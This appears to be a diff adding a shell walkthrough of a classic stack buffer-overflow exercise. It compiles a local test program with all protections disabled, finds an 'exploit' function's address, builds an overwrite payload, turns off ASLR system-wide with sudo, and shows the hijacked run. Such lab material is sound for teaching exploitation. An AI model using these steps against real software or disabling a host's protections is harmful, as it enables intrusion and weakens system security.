@@ -1,0 +1,42 @@
+gcc opcodeTest.c -O2 \
+    -fno-stack-protector \
+    -U_FORTIFY_SOURCE \
+    -z execstack \
+    -no-pie \
+    -fomit-frame-pointer \
+    -fcf-protection=none \
+    -o vuln
+
+
+objdump -d vuln | sed -n '/<sum>/,/<ret/p'
+
+
+exploit_addr=$(objdump -d vuln \
+  | awk '/<exploit>:/ { sub(/:$/,"",$1); print "0x"$1; exit }')
+echo "exploit() @ $exploit_addr"
+
+
+python3 - <<EOF > payload.bin
+import sys
+pad_bytes    = 56             # from step 2
+exploit_addr = int("$exploit_addr",16)
+
+payload = b"A"*pad_bytes
+payload += exploit_addr.to_bytes(8,'little')
+sys.stdout.buffer.write(payload)
+EOF
+
+
+wc -c payload.bin   # should be pad_bytes + 8
+hexdump -C payload.bin | tail -n1
+# … | <little‑endian exploit_addr> |
+
+
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+./vuln < payload.bin
+
+
+buf starts at 0x7fffffffXXXX
+Enter payload:
+CODE REUSE OCCURED!
+
